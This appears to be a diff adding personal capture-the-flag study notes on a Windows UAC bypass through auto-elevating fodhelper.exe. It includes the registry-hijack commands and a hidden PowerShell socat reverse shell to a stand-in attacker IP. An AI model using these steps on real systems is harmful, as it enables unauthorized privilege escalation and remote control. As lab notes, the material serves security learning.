@@ -28,3 +28,40 @@ run: azman.msc
 THM{GUI_UAC_BYPASSED_AGAIN}
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+UAC:Auto-elevating processes
+-exe must be signed by the windows publisher
+-exe must be contained in a trusted directory - %SystemRoot%/System32/ or %ProgramFiles%/
+-exe must declare the autoElevate element inside their manifests
+
+check file's manifest using sigcheck
+sigcheck64.exe -m c:/windows/system32/msconfig.exe
+
+fodhelper.exe - windows default executable manages language features
+-can autoelevate using default UAC settings
+-does not prompt for elevation
+-can be used in medium integrity remote shell and leveraged into a fully functional high integrity process eg Glpteba malware
+
+-windows checks registery to open a file to see which application to use using Programmatic ID(progID)
+-specified in HKEY_CLASSES_ROOT command specified in shell/open/command
+-can use user-specific if specified. if not system-wide association HKEY_CURRENT_USER (HKCU), HKEY_LOCAL_MACHINE (HKLM) respectively
+
+steps:
+attack machine: nc [UACIP] 9999
+net user attacker | find "Local Group"
+whoami /groups | find "Label"
+
+C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
+
+C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+C:\> reg add %REG_KEY% /d %CMD% /f
+
+nc -lvp 4444
+C:\> fodhelper.exe
+
+C:\> C:\flags\GetFlag-fodhelper.exe
+THM{AUTOELEVATE4THEWIN}
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
